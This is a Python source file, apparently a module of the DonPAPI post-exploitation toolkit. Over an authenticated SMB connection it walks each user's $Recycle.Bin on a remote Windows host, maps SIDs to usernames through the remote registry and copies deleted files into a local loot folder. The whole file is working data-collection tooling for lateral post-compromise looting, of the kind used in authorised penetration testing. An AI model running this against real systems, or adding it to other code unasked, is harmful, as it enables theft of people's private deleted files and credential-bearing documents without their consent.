import os
import ntpath
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter

# Module by @Defte_
TAG = "RecycleBin"

class RecycleBinDump:
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
    max_filesize = 5000000

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.found = 0

    def run(self) -> None:
        self.logger.display("Gathering recycle bins")
        for sid_directory in self.conn.remote_list_dir(self.context.share, "\\$Recycle.Bin"):
            sid = sid_directory.get_longname()
            if sid_directory.get_longname() not in self.false_positive: 
                username = None
                # Translates $Recycle.Bin SID's to usernames using remote registry keys
                if self.context.remoteops_allowed:
                    username = self.translate_sid_to_username(sid)
                self.dig_files(
                    directory_path = f"\\$Recycle.Bin\\{sid}", 
                    sid = sid,
                    username = username,
                    recurse_level = 0, 
                    recurse_max = 10,
                )
        self.logger.secret(f"Found {self.found} files in recycle bin's", TAG)

    def translate_sid_to_username(self, sid) -> str:
        username = None
        path = f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid}"
        key = "ProfileImagePath\x00"
        try:
            username = self.context.reg_query_value(path, key)[-1].split("\\")[-1].rstrip("\x00")
        except Exception as e:
            if "ERROR_FILE_NOT_FOUND" not in str(e):
                self.logger.error(f"Error while RegQueryValue {path}\\{key}: {e}")
        return username

    def dig_files(self, directory_path, sid, username = None, recurse_level = 0, recurse_max = 10) -> None:
        directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    new_path = ntpath.join(directory_path, item.get_longname())
                    if item.is_directory() > 0:
                        if recurse_level < recurse_max:
                            self.dig_files(
                                directory_path = new_path, 
                                sid = sid,
                                username = username ,
                                recurse_level = recurse_level+1, 
                                recurse_max = recurse_max
                            )
                    else:
                        if item.get_filesize() < self.max_filesize:                            
                            file_content = self.conn.readFile(self.context.share, new_path)
                            self.found += 1
                            local_filepath = os.path.join(self.context.output_dir, *(new_path.split('\\')))
                            
                            if username is not None:
                                local_filepath = local_filepath.replace(sid, username)

                            os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
                            with open(local_filepath, "wb") as f:
                                if file_content is None:
                                    file_content = b""
                                f.write(file_content)
                            
                            # Stores files in loot\RecycleBin
                            os.makedirs(f"{self.context.output_dir}/../RecycleBin", exist_ok=True)
                            local_filepath = os.path.join(
                                f"{self.context.output_dir}/../RecycleBin", 
                                f"{item.get_longname()}-{self.found}"
                            )

                            if username is not None:
                                local_filepath = local_filepath.replace(sid, username)

                            with open(local_filepath, "wb") as f:
                                if file_content is None:
                                    file_content = b""
                                f.write(file_content)
